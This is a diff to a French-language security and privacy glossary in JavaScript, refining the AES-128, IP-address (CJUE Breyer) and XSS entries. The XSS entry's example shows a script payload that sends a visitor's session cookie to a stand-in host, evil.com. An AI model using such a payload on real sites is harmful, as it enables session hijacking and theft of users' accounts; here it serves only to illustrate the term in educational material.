@@ -1218,7 +1218,7 @@ const families = [
       {
         name: "AES-128",
         aka: "Advanced Encryption Standard",
-        desc: "Algorithme de chiffrement symétrique par blocs adopté par la norme LoRaWAN. Recommandé par l'ANSSI pour la protection des données jusqu'au niveau « Diffusion Restreinte ». Taille de clé : 128 bits.",
+        desc: "Algorithme de chiffrement symétrique par blocs adopté par la norme LoRaWAN. AES-128 est admis par le RGS B1 de l'ANSSI comme taille minimale recommandée pour la cryptographie symétrique. Pour les informations marquées « Diffusion Restreinte » (IGI 1300), c'est la qualification du produit (CSPN, EAL) qui prime, et la plupart des produits qualifiés DR utilisent AES-256.",
         example: "LoRaWAN 1.0.x -> AES-128 obligatoire pour NwkSKey et AppSKey"
       },
       {
@@ -1292,8 +1292,8 @@ const families = [
       {
         name: "Adresse IP",
         aka: "Internet Protocol Address (v4/v6)",
-        desc: "Identifiant réseau considéré comme une donnée personnelle par la jurisprudence européenne (CJUE, Breyer c. Allemagne, 2016). Même une IP dynamique est personnelle si le FAI peut la relier à un abonné.",
-        example: "192.168.1.42 -> donnée personnelle (CJUE 2016)"
+        desc: "Identifiant réseau considéré comme une donnée personnelle par la jurisprudence européenne (CJUE, Breyer c. Allemagne, 2016, C-582/14). L'arrêt vise les IP publiques dynamiques attribuées par un FAI, qui restent personnelles dès lors qu'un tiers (le FAI) peut les relier à un abonné. Les IP privées RFC 1918 (192.168.x, 10.x, 172.16-31.x) ne sont pas couvertes par cette jurisprudence sans contexte d'identification supplémentaire.",
+        example: "82.123.45.6 (IP publique dynamique attribuée par un FAI) -> donnée personnelle (CJUE Breyer 2016)"
       }
     ]
   },
@@ -1567,8 +1567,8 @@ const families = [
       },
       {
         name: "XSS",
-        aka: "Cross-Site Scripting (OWASP A07:2021)",
-        desc: "Injection de code JavaScript malveillant dans une page web consultée par d'autres utilisateurs. Permet le vol de cookies de session, la redirection vers des sites de phishing ou la modification du contenu affiché.",
+        aka: "Cross-Site Scripting (OWASP A03:2021 Injection)",
+        desc: "Injection de code JavaScript malveillant dans une page web consultée par d'autres utilisateurs. Permet le vol de cookies de session, la redirection vers des sites de phishing ou la modification du contenu affiché. Depuis OWASP 2021, XSS est fusionné avec les autres injections (SQLi, LDAP, etc.) dans la catégorie A03.",
         example: "&lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt;"
       },
       {
